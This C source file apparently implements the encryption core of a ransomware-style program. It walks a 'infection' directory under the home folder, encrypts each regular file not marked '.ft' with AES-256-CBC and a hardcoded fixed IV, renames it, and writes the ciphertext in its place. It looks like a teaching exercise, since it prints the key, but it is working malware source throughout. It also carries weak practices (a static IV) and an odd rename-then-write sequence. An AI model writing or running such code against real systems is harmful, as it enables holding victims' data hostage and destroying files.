#include "encryption.h"

int encrypt(crypto_params *params) {
    EVP_CIPHER_CTX *ctx;
    int len;

    // Create and initialize the context
    if (!(ctx = EVP_CIPHER_CTX_new())) return -1;

    // Initialize encryption operation (AES-256-CBC)
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, params->key, params->iv) != 1) return -1;

    // Encrypt the plaintext
    if (EVP_EncryptUpdate(ctx, params->output, &len, params->input, params->input_len) != 1) return -1;
    params->output_len = len;

    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, params->output + len, &len) != 1) return -1;
    params->output_len += len;

    printf("Encryption key: ");
    for (int i = 0; i < KEY_SIZE; i++) {
        printf("%02x", params->key[i]);
    }
    printf("\n");

    // Clean up
    EVP_CIPHER_CTX_free(ctx);

    return params->output_len;
}

void encrypt_files() {
    crypto_params params;
    params.key = (unsigned char *)malloc(KEY_SIZE);
    // Generate random key
    RAND_bytes(params.key, KEY_SIZE);
    
    // Set a fixed IV
    unsigned char iv[IV_SIZE] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 
                                 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F};
    memcpy(params.iv, iv, IV_SIZE);

    // Get the infection directory
    char path[256];
    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);
    DIR *dir = opendir(path);
    struct dirent *entry;
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
            if (!strstr(filepath, ".ft")) {
                FILE *file = fopen(filepath, "rb");
                if (file) {
                    // Read the file
                    fseek(file, 0, SEEK_END);
                    long file_len = ftell(file);
                    fseek(file, 0, SEEK_SET);

                    // Allocate memory for input and output based on file size
                    params.input = (unsigned char *)malloc(file_len);
                    params.output = (unsigned char *)malloc(file_len + EVP_CIPHER_block_size(EVP_aes_256_cbc())); // Ensure space for padding

                    fread(params.input, 1, file_len, file);
                    fclose(file);

                    params.input_len = file_len;

                    // Encrypt the file
                    encrypt(&params);
                    rename_file(filepath);

                    // Write the encrypted file with IV prepended
                    FILE *encrypted_file = fopen(filepath, "wb");
                    fwrite(params.iv, 1, IV_SIZE, encrypted_file);
                    fwrite(params.output, 1, params.output_len, encrypted_file);
                    fclose(encrypted_file);

                    // Free allocated memory for this iteration
                    free(params.input);
                    free(params.output);
                }
            }
        }
    }

    // Free resources
    free(params.key);
    closedir(dir);
}